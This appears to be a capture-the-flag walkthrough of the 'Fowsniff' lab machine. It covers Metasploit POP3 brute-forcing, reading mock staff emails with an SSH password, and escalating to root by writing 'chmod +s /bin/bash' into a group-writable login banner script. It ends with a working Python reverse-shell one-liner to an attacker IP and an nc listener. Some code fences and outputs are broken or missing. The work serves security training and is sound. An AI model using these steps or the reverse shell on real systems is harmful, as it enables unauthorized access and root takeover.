Fowsniff Corporation Passwords LEAKED!
FOWSNIFF CORP PASSWORD DUMP!
 
Here are their email passwords dumped from their databases.
They left their pop3 server WIDE OPEN, too!
 
MD5 is insecure, so you shouldn't have trouble cracking them but I was too lazy haha =P

```

The challenge ask us to bruteforce the pop3 login. Let's fire up metasploit then
```
msfconsole
```

While it's loading, let's prepare our userpass file
```

```

In ```msfconsole``` let's use the 'scanner/pop3/pop3_login' plugin
```
use scanner/pop3/pop3_login
```

Let's check the options
```

After setting the "RHOST" to our target IP, and "USERPASS_FILE" to our userpass.txt file, let's unset "USER_FILE" and "PASS_FILE" as we don't need them
```
unset USER_FILE
unset PASS_FILE
```

Let's run the exploit
```

From: stone@fowsniff (stone)

Dear All,

A few days ago, a malicious actor was able to gain entry to
our internal email systems. The attacker was able to exploit
incorrectly filtered escape characters within our SQL database
to access our login credentials. Both the SQL and authentication
system used legacy methods that had not been updated in some time.

We have been instructed to perform a complete internal system
overhaul. While the main systems are "in the shop," we have
moved to this isolated, temporary server that has minimal
functionality.

This server is capable of sending and receiving emails, but only
locally. That means you can only send emails to other users, not
to the world wide web. You can, however, access this system via 
the SSH protocol.

The temporary password for SSH is "S1ck3nBluff+secureshell"

You MUST change this password as soon as possible, and you will do so under my
guidance. I saw the leak the attacker posted online, and I must say that your
passwords were not very secure.

Come see me in my office at your earliest convenience and we'll set it up.

Thanks,
A.J Stone

Devin,

You should have seen the brass lay into AJ today!
We are going to be talking about this one for a looooong time hahaha.
Who knew the regional manager had been in the navy? She was swearing like a sailor!

I don't know what kind of pneumonia or something you brought back with
you from your camping trip, but I think I'm coming down with it myself.
How long have you been gone - a week?
Next time you're going to get sick and miss the managerial blowout of the century,
at least keep it to yourself!

I'm going to head home early and eat some chicken soup. 
I think I just got an email from Stone, too, but it's probably just some
"Let me explain the tone of my meeting with management" face-saving mail.
I'll read it when I get back.

Feel better,

Skyler

PS: Make sure you change your email password. 
AJ had been telling us to do that right before Captain Profanity showed up.
```

List of POP commands can be found in [1]

We now have a temporary ssh password
```
S1ck3nBluff+secureshell
```

and apparently some staff is on vacation, so they probably didn't change their password. Also, Skyler (baksteen@fowsniff) seems not to have read the previous email. She probably didn't update her password.

Let's try to ssh
```
ssh baksteen@$IP

baksteen@10.10.12.194's password: S1ck3nBluff+secureshell

Let's check this 'cube.sh'
```
printf "
                            _____                       _  __  __

```

It seems to be just the wall. However, it seems to be owned by someone else
```
-rw-rwxr-- 1 parede users  851 Mar 11  2018 cube.sh
```

As we can modify it (being part of the 'users' group), maybe we can modify it, and when loging in again, it will be executed with higher privileges.

Let's try to make ```/bin/bash``` suid, using the ```sudo``` command
```
sudo chmod +s /bin/bash
```

Let's reconnect and check
```
-bash-4.3$ ls -al /bin/bash

-rwsr-sr-x 1 root root 1037528 May 16  2017 /bin/bash
```

It worked. Let's get root
```
/bin/bash -p

bash-4.3# whoami
root
```

We are root !!!

## To Go Further

The challenge ask us to get a reverse shell, but it's not necessary. We could have put a command like

```sh
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.18.23.136",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

then start a listener
```sh
nc -lnvp 9999
```

and login again, to get a reverse shell as root.

As the challenge rightfully point it out, when looking at the file '/etc/update-motd.d/00-header'
```
#!/bin/sh
#
#    00-header - create the header of the MOTD

#[ -r /etc/lsb-release ] && . /etc/lsb-release

#if [ -z "$DISTRIB_DESCRIPTION" ] && [ -x /usr/bin/lsb_release ]; then

sh /opt/cube/cube.sh
```

It's running the 'cube.sh' file, and '00-header' is owned by root
```
-rwxr-xr-x  1 root root 1248 Mar 11  2018 00-header
```

So this banner at login, is run by root. Modifying 'cube.sh' will end up in running code as root.
